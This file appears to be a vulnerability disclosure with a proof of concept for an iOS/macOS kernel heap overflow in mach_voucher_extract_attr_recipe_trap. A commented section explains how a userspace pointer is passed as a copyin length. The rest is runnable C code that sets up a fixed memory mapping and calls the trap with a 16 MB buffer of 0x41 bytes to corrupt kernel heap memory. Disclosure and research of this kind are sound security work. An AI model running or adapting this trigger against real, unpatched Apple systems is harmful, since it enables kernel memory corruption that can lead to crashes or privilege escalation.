// ianbeer
#if 0
iOS/MacOS kernel memory corruption due to userspace pointer being used as a length

mach_voucher_extract_attr_recipe_trap is a mach trap which can be called from any context

Here's the code:

	kern_return_t
	mach_voucher_extract_attr_recipe_trap(struct mach_voucher_extract_attr_recipe_args *args)
	{
		ipc_voucher_t voucher = IV_NULL;
		kern_return_t kr = KERN_SUCCESS;
		mach_msg_type_number_t sz = 0;

		if (copyin(args->recipe_size, (void *)&sz, sizeof(sz)))     <---------- (a)
			return KERN_MEMORY_ERROR;

		if (sz > MACH_VOUCHER_ATTR_MAX_RAW_RECIPE_ARRAY_SIZE)
			return MIG_ARRAY_TOO_LARGE;

		voucher = convert_port_name_to_voucher(args->voucher_name);
		if (voucher == IV_NULL)
			return MACH_SEND_INVALID_DEST;

		mach_msg_type_number_t __assert_only max_sz = sz;

		if (sz < MACH_VOUCHER_TRAP_STACK_LIMIT) {
			/* keep small recipes on the stack for speed */
			uint8_t krecipe[sz];
			if (copyin(args->recipe, (void *)krecipe, sz)) {
				kr = KERN_MEMORY_ERROR;
				goto done;
			}
			kr = mach_voucher_extract_attr_recipe(voucher, args->key,
																						(mach_voucher_attr_raw_recipe_t)krecipe, &sz);
			assert(sz <= max_sz);

			if (kr == KERN_SUCCESS && sz > 0)
				kr = copyout(krecipe, (void *)args->recipe, sz);
		} else {
			uint8_t *krecipe = kalloc((vm_size_t)sz);                 <---------- (b)
			if (!krecipe) {
				kr = KERN_RESOURCE_SHORTAGE;
				goto done;
			}

			if (copyin(args->recipe, (void *)krecipe, args->recipe_size)) {         <----------- (c)
				kfree(krecipe, (vm_size_t)sz);
				kr = KERN_MEMORY_ERROR;
				goto done;
			}

			kr = mach_voucher_extract_attr_recipe(voucher, args->key,
																						(mach_voucher_attr_raw_recipe_t)krecipe, &sz);
			assert(sz <= max_sz);

			if (kr == KERN_SUCCESS && sz > 0)
				kr = copyout(krecipe, (void *)args->recipe, sz);
			kfree(krecipe, (vm_size_t)sz);
		}

		kr = copyout(&sz, args->recipe_size, sizeof(sz));

	done:
		ipc_voucher_release(voucher);
		return kr;
	}


Here's the argument structure (controlled from userspace)

	struct mach_voucher_extract_attr_recipe_args {
		PAD_ARG_(mach_port_name_t, voucher_name);
		PAD_ARG_(mach_voucher_attr_key_t, key);
		PAD_ARG_(mach_voucher_attr_raw_recipe_t, recipe);
		PAD_ARG_(user_addr_t, recipe_size);
	};

recipe and recipe_size are userspace pointers.

At point (a) four bytes are read from the userspace pointer recipe_size into sz.

At point (b) if sz was less than MACH_VOUCHER_ATTR_MAX_RAW_RECIPE_ARRAY_SIZE (5120) and greater than MACH_VOUCHER_TRAP_STACK_LIMIT (256)
sz is used to allocate a kernel heap buffer.

At point (c) copyin is called again to copy userspace memory into that buffer which was just allocated, but rather than passing sz (the 
validate size which was allocated) args->recipe_size is passed as the size. This is the userspace pointer *to* the size, not the size!

This leads to a completely controlled kernel heap overflow.

Tested on MacOS Sierra 10.12.1 (16B2555)
#endif

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <mach/mach_error.h>
#include <mach/mach_traps.h>
#include <mach/mach_voucher_types.h>

#include <atm/atm_types.h>

mach_port_t get_voucher() {
  mach_voucher_attr_recipe_data_t r = {
    .key = MACH_VOUCHER_ATTR_KEY_ATM,
    .command = MACH_VOUCHER_ATTR_ATM_CREATE
  };
  mach_port_t p = MACH_PORT_NULL;
  kern_return_t err = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&r, sizeof(r), &p);

  if (err != KERN_SUCCESS) {
    printf("failed to create voucher (%s)\n", mach_error_string(err));
    exit(EXIT_FAILURE);
  }
   printf("got voucher: %x\n", p);

  return p;
}

uint64_t map(uint64_t addr, uint64_t size) {
  uint64_t _addr = addr;
  kern_return_t err = mach_vm_allocate(mach_task_self(), &_addr, size, 0);
  if (err != KERN_SUCCESS || _addr != addr) {
    printf("failed to allocate fixed mapping: %s\n", mach_error_string(err));
    exit(EXIT_FAILURE);
  }
  return addr;
}

int main() {
  void* recipe_size = (void*)map(0x123450000, 0x1000);
  *(uint64_t*)recipe_size = 0x1000;

  uint64_t size = 0x1000000;
  void* recipe = malloc(size);
  memset(recipe, 0x41, size);

  mach_port_t port = get_voucher();
  kern_return_t err = mach_voucher_extract_attr_recipe_trap(
      port,
      1,
      recipe,
      recipe_size);

  printf("%s\n", mach_error_string(err));

  return 41;
}
